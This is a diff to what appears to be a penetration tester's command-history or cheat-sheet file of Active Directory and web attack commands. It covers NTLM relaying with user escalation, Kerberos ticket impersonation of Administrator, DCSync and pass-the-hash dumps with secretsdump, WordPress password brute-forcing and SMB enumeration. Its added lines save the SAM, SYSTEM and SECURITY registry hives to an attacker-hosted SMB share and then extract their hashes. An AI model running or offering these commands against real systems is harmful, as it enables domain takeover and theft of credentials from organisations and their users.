@@ -25,7 +25,6 @@ ntlmrelayx -t ldap://DC01.BREAKING.BAD -smb2support --escalate-user SHUTDOWN
 curl --ntlm -u "someuser":"somepassword" 127.0.0.1
 getST.py -spn host/SV01.BREAKING.BAD -impersonate Administrator -dc-ip 192.168.56.101 BREAKING.BAD/'SHUTDOWN$':123soleil
 getST.py -force-forwardable -spn host/SV01.BREAKING.BAD -impersonate Administrator -dc-ip 192.168.56.101 -hashes :01234567890sv01nthash01234567890 BREAKING.BAD/SV01
-secretsdump -sam sam.save -system system.save -security security.save LOCAL
 secretsdump -k -outputfile BREAKING.BAD DC02.BREAKING.BAD
 secretsdump -outputfile BREAKING.BAD -just-dc -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad
 secretsdump -just-dc -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad
@@ -98,8 +97,6 @@ cewl --depth 10 --with-numbers --write cewl.txt 192.168.10.10
 wpscan --api-token APITOKEN --url http://192.168.10.10/ --no-banner --plugins-version-detection passive --password-attack xmlrpc -U 'admin' -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt
 wpscan --api-token APITOKEN --url http://192.168.10.10/ --no-banner --plugins-detection aggressive
 wpscan --api-token APITOKEN --url http://192.168.10.10/ --no-banner --enumerate u1-20
-smbserver.py SHUTDOWN .
-smbserver.py -smb2support SHUTDOWN .
 nmblookup -A 192.168.10.10
 nmap --script 'smb-enum*' --script-args unsafe=1 -T5 192.168.10.10
 smbmap -H 192.168.10.10
@@ -332,4 +329,10 @@ manspider --threads 50 192.168.56.0/24 -d BREAKING.BAD -u someuser -H bb38628253
 dcsync.py -dc "dc01.domain.local" -t "CN=someuser,OU=Users,DC=DOMAIN,DC=LOCAL" 'domain\someuser:somepassword'
 gMSADumper.py -d "domain.local" -l "dc01.domain.local" -u "someuser" -p "somepassword"
 modifyCertTemplate.py -template KerberosAuthentication -get-acl "domain.local"/"someuser":"somepassword"
+smbserver.py -smb2support SHUTDOWN .
+reg.py 'domain.local/backup_operator:somepassword@192.168.56.101' save -keyName 'HKLM\SAM' -o '\\192.168.56.1\SHUTDOWN'
+reg.py 'domain.local/backup_operator:somepassword@192.168.56.101' save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.1\SHUTDOWN'
+reg.py 'domain.local/backup_operator:somepassword@192.168.56.101' save -keyName 'HKLM\SECURITY' -o '\\192.168.56.1\SHUTDOWN'
+reg.py 'domain.local/backup_operator:somepassword@192.168.56.101' backup -o '\\192.168.56.1\SHUTDOWN'
+secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
